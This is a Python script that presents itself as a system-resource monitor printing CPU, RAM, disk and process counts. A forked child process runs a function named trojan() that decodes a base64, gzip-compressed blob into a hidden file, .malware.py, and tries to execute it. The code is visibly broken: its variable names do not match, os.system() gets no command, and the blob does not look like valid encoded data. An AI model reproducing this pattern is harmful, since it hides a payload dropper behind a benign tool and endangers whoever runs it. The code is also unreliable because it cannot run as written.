import psutil
import base64
import time 
import gzip
import os

def main():
    # fork a child process
    pid = os.fork()

    if pid > 0:
        #parent process
        while True:
            # percentage of used CPU
            cpu = psutil.cpu_percent()
            # percentage of used RAM
            ram = psutil.virtual_memory().percent
            # percentage of used disk space
            disk = psutil.disk_usage("/").percent
            # number of all running processes
            process_count = 0
            for _ in psutil.process_iter():
                process_count += 1

            # print to screen
            print("-----------------------------------------------------------")
            print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES  |")    
            print("| {:02}%       | {:02}%       | {:02}%       | {}                |".format(int(cpu), int(ram), int(disk), process_count))
            print("-----------------------------------------------------------")

            # sleep for 2s
            time.sleep(2)
        
    else:
        # child process
        trojan()


def trojan():
    malware_id = open(".malware.py", "w")
    blob = "H4sICAnwqvdbgded2wudhe2H8FEWUINDUufeiwqhndHU9HdnuqhswqshjuDBHUJudVFEWhjbhuBFHEbhufewufbwjbfeuwvbfew"
    malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
    malware_fd.write(malware)
    malware_fd.close()


    # execute malware
    os.system()


if __name__ == "__main__":
    main()

